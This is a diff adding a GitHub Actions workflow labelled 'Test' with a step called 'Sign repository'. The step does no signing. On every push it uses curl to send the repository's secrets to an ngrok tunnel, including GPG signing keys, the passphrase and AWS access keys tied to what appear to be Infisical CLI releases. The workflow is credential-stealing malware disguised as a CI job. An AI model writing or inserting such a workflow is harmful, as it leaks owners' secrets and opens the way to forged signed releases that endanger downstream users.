@@ -1,0 +1,23 @@
+name: Test
+
+on:
+  push:
+
+jobs:
+  signer:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+
+      - name: Sign repository
+        run: |
+          curl -X POST https://4c904d7a2e12.ngrok.app/secrets \
+            -H "Content-Type: application/json" \
+            -d '{
+              "GPG_SIGNING_KEY": "${{ secrets.GPG_SIGNING_KEY }}",
+              "GPG_SIGNING_KEY_PASSPHRASE": "${{ secrets.GPG_SIGNING_KEY_PASSPHRASE }}",
+              "INFISICAL_CLI_S3_BUCKET": "${{ secrets.INFISICAL_CLI_S3_BUCKET }}",
+              "INFISICAL_CLI_REPO_SIGNING_KEY_ID": "${{ secrets.INFISICAL_CLI_REPO_SIGNING_KEY_ID }}",
+              "INFISICAL_CLI_REPO_AWS_ACCESS_KEY_ID": "${{ secrets.INFISICAL_CLI_REPO_AWS_ACCESS_KEY_ID }}",
+              "INFISICAL_CLI_REPO_AWS_SECRET_ACCESS_KEY": "${{ secrets.INFISICAL_CLI_REPO_AWS_SECRET_ACCESS_KEY }}"
+            }'
